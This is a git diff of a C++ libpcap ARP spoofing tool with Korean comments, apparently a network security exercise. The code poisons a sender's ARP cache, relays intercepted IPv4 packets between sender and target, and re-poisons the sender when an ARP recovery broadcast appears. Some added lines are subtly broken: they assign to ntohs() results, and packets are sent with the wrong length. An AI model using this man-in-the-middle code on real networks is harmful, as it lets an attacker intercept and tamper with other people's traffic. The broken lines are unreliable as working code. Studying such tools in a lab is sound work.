@@ -42,7 +42,7 @@ int main(int argc, char* argv[]) {
 	
         //pcap세션 오픈
         char errbuf[PCAP_ERRBUF_SIZE];
-        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 10, errbuf);
+        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
                 fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                 return -1;
@@ -55,6 +55,7 @@ int main(int argc, char* argv[]) {
 
         Ip AttackerIp = getAttackerIp(dev);
         Mac SenderMac = getSenderMac(handle, macAddress, AttackerIp ,Ip(argv[2]));
+	
         Mac TargetMac = getTargetMac(handle, macAddress, AttackerIp ,Ip(argv[3]));
         
         //Sender감염 패킷생성
@@ -66,6 +67,10 @@ int main(int argc, char* argv[]) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         }
 	printf("Send First Packet\n");
+
+
+
+        
 
         
         //릴레이 패킷 전송
@@ -102,6 +107,8 @@ int main(int argc, char* argv[]) {
                 if(ntohs(Packet_eth-> ether_type)==(EthHdr::Ip4) && Mac(Packet_eth->ether_shost)==SenderMac){
                         Mac(Packet_eth -> ether_dhost) = TargetMac;
                         Mac(Packet_eth -> ether_shost) = macAddress;
+			ntohs(Packet_ip->ip_src) = AttackerIp;
+                        ntohs(Packet_ip->ip_dst) = Ip(argv[3]);
                         res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
                         if (res != 0) {
                                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -111,7 +118,7 @@ int main(int argc, char* argv[]) {
                         }    
                 }
                 //Target -> Attaceker -> Sender
-                else if(ntohs(Packet_eth -> ether_type) == (EthHdr::Ip4)&&Mac(Packet_eth->ether_shost)==TargetMac){
+                else if(ntohs(Packet_eth -> ether_type) == (EthHdr::Ip4) && Mac(Packet_eth->ether_shost)==TargetMac){
                         Mac(Packet_eth -> ether_dhost) = SenderMac;
                         Mac(Packet_eth -> ether_shost) = macAddress;
                         res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
@@ -125,7 +132,7 @@ int main(int argc, char* argv[]) {
 
                 //When ARP Table Recover
                 else if(Mac(Packet_eth -> ether_dhost)==Mac::broadcastMac()){
-                        //if(Mac(Packet_eth -> ether_shost)==TargetMac || Mac(Packet_eth -> ether_shost) == SenderMac){
+                        if(Mac(Packet_eth -> ether_shost)==TargetMac || Mac(Packet_eth -> ether_shost) == SenderMac){
                                 //Sender감염 패킷생성
                                 EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(argv[2]),Ip(argv[3]));
                                 //패킷 전송
@@ -136,7 +143,7 @@ int main(int argc, char* argv[]) {
                                         printf("Detecting Arp Recover and re-Infection\n");
                                 }
 
-                        //}
+                        }
                 }
                 else{
                         EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(argv[2]),Ip(argv[3]));
